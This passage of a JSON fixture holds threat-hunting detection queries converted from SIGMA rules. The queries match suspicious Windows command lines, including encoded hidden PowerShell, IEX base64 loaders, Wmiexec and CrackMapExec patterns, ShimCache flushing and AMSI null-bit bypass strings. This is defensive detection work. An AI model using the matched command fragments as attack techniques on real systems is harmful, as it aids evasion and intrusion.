            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"[Type]::GetTypeFromCLSID(\" and (tgt.process.cmdline contains \"0002DF01-0000-0000-C000-000000000046\" or tgt.process.cmdline contains \"F6D90F16-9C73-11D3-B32E-00C04F990BB4\" or tgt.process.cmdline contains \"F5078F35-C551-11D3-89B9-0000F81FE221\" or tgt.process.cmdline contains \"88d96a0a-f192-11d4-a65f-0040963251e5\" or tgt.process.cmdline contains \"AFBA6B42-5692-48EA-8141-DC517DCF0EF1\" or tgt.process.cmdline contains \"AFB40FFD-B609-40A3-9828-F88BBE11E4E3\" or tgt.process.cmdline contains \"88d96a0b-f192-11d4-a65f-0040963251e5\" or tgt.process.cmdline contains \"2087c2f4-2cef-4953-a8ab-66779b670495\" or tgt.process.cmdline contains \"000209FF-0000-0000-C000-000000000046\" or tgt.process.cmdline contains \"00024500-0000-0000-C000-000000000046\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 781
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious ways to run Invoke-Execution using IEX alias",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious PowerShell IEX Execution Patterns",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \" | iex;\" or tgt.process.cmdline contains \" | iex \" or tgt.process.cmdline contains \" | iex}\" or tgt.process.cmdline contains \" | IEX ;\" or tgt.process.cmdline contains \" | IEX -Error\" or tgt.process.cmdline contains \" | IEX (new\" or tgt.process.cmdline contains \");IEX \")) and (tgt.process.cmdline contains \"::FromBase64String\" or tgt.process.cmdline contains \".GetString([System.Convert]::\")) or (tgt.process.cmdline contains \")|iex;$\" or tgt.process.cmdline contains \");iex($\" or tgt.process.cmdline contains \");iex $\" or tgt.process.cmdline contains \" | IEX | \" or tgt.process.cmdline contains \" | iex\\\\\"\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 782
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child process of applications launched from inside the WindowsApps directory. This could be a sign of a rogue \".appx\" package installation/execution",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potentially Suspicious Windows App Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"C:\\Program Files\\WindowsApps\\\" and ((tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.cmdline contains \"cmd /c\" or tgt.process.cmdline contains \"Invoke-\" or tgt.process.cmdline contains \"Base64\")) and (not (src.process.image.path contains \":\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal\" and src.process.image.path contains \"\\WindowsTerminal.exe\" and (tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\pwsh.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 783
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects attempts of decoding a base64 Gzip archive via PowerShell. This technique is often used as a method to load malicious content into memory afterward.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1132"
            ],
            "name": "Suspicious FromBase64String Usage On Gzip Archive - Process Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"FromBase64String\" and tgt.process.cmdline contains \"MemoryStream\" and tgt.process.cmdline contains \"H4sI\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 784
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects creation of a new service via \"sc\" command or the powershell \"new-service\" cmdlet with suspicious binary paths",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543"
            ],
            "name": "Suspicious New Service Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\sc.exe\" and (tgt.process.cmdline contains \"create\" and tgt.process.cmdline contains \"binPath=\")) or (tgt.process.cmdline contains \"New-Service\" and tgt.process.cmdline contains \"-BinaryPathName\")) and (tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"wscript\" or tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"svchost\" or tgt.process.cmdline contains \"dllhost\" or tgt.process.cmdline contains \"cmd \" or tgt.process.cmdline contains \"cmd.exe /c\" or tgt.process.cmdline contains \"cmd.exe /k\" or tgt.process.cmdline contains \"cmd.exe /r\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"C:\\Users\\Public\" or tgt.process.cmdline contains \"\\Downloads\\\" or tgt.process.cmdline contains \"\\Desktop\\\" or tgt.process.cmdline contains \"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" or tgt.process.cmdline contains \"C:\\Windows\\TEMP\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 785
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1560"
            ],
            "name": "Rar Usage with Password and Compression Level",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" -hp\" and (tgt.process.cmdline contains \" -m\" or tgt.process.cmdline contains \" a \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 786
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect indirect command execution via Program Compatibility Assistant pcwrun.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Indirect Command Execution By Program Compatibility Wizard",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\pcwrun.exe\") | columns ComputerName,tgt.process.user,src.process.cmdline,tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 787
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects actions that clear the local ShimCache and remove forensic evidence",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1112"
            ],
            "name": "ShimCache Flush",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"rundll32\" and tgt.process.cmdline contains \"apphelp.dll\") and (tgt.process.cmdline contains \"ShimFlushCache\" or tgt.process.cmdline contains \"#250\")) or ((tgt.process.cmdline contains \"rundll32\" and tgt.process.cmdline contains \"kernel32.dll\") and (tgt.process.cmdline contains \"BaseFlushAppcompatCache\" or tgt.process.cmdline contains \"#46\")))) | columns tgt.process.image.path,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 788
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated use of Clip.exe to execute PowerShell",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation CLIP+ Launcher",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"cmd\" and tgt.process.cmdline contains \"&&\" and tgt.process.cmdline contains \"clipboard]::\" and tgt.process.cmdline contains \"-f\") and (tgt.process.cmdline contains \"/c\" or tgt.process.cmdline contains \"/r\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 789
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity.\nScreensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "Suspicious ScreenSave Change by Reg.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" or tgt.process.cmdline contains \"HKCU\\Control Panel\\Desktop\")) and ((tgt.process.cmdline contains \"/v ScreenSaveActive\" and tgt.process.cmdline contains \"/t REG_SZ\" and tgt.process.cmdline contains \"/d 1\" and tgt.process.cmdline contains \"/f\") or (tgt.process.cmdline contains \"/v ScreenSaveTimeout\" and tgt.process.cmdline contains \"/t REG_SZ\" and tgt.process.cmdline contains \"/d \" and tgt.process.cmdline contains \"/f\") or (tgt.process.cmdline contains \"/v ScreenSaverIsSecure\" and tgt.process.cmdline contains \"/t REG_SZ\" and tgt.process.cmdline contains \"/d 0\" and tgt.process.cmdline contains \"/f\") or (tgt.process.cmdline contains \"/v SCRNSAVE.EXE\" and tgt.process.cmdline contains \"/t REG_SZ\" and tgt.process.cmdline contains \"/d \" and tgt.process.cmdline contains \".scr\" and tgt.process.cmdline contains \"/f\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 790
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects WMIC executions in which an event consumer gets created. This could be used to establish persistence",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "New ActiveScriptEventConsumer Created Via Wmic.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"ActiveScriptEventConsumer\" and tgt.process.cmdline contains \" CREATE \")) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 791
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "HxTsr.exe is a Microsoft compressed executable file called Microsoft Outlook Communications.\nHxTsr.exe is part of Outlook apps, because it resides in a hidden \"WindowsApps\" subfolder of \"C:\\Program Files\".\nAny instances of hxtsr.exe not in this folder may be malware camouflaging itself as HxTsr.exe\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Potential Fake Instance Of Hxtsr.EXE Executed",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\hxtsr.exe\" and (not (tgt.process.image.path contains \":\\program files\\windowsapps\\microsoft.windowscommunicationsapps_\" and tgt.process.image.path contains \"\\hxtsr.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 792
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of PowerShell with a specific flag sequence that is used by the Wmiexec script",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "HackTool - Wmiexec Default Powershell Command",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"-NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 793
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects various execution patterns of the CrackMapExec pentesting framework",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047",
                "t1053",
                "t1059",
                "t1059"
            ],
            "name": "HackTool - CrackMapExec Execution Patterns",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline=\"*cmd.exe /Q /c * 1> \\\\*\\*\\* 2>&1*\" or tgt.process.cmdline=\"*cmd.exe /C * > \\\\*\\*\\* 2>&1*\" or tgt.process.cmdline=\"*cmd.exe /C * > *\\Temp\\* 2>&1*\" or tgt.process.cmdline contains \"powershell.exe -exec bypass -noni -nop -w 1 -C \\\"\" or tgt.process.cmdline contains \"powershell.exe -noni -nop -w 1 -enc \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 794
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious process spawning from an Outlook process.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1204"
            ],
            "name": "Suspicious Outlook Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\OUTLOOK.EXE\" and (tgt.process.image.path contains \"\\AppVLP.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\hh.exe\" or tgt.process.image.path contains \"\\mftrace.exe\" or tgt.process.image.path contains \"\\msbuild.exe\" or tgt.process.image.path contains \"\\msdt.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\scrcons.exe\" or tgt.process.image.path contains \"\\scriptrunner.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\svchost.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 795
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of special strings/null bits in order to potentially bypass AMSI functionalities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Potential AMSI Bypass Using NULL Bits",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"if(0){{{0}}}' -f $(0 -as [char]) +\" or tgt.process.cmdline contains \"#<NULL>\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 796
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
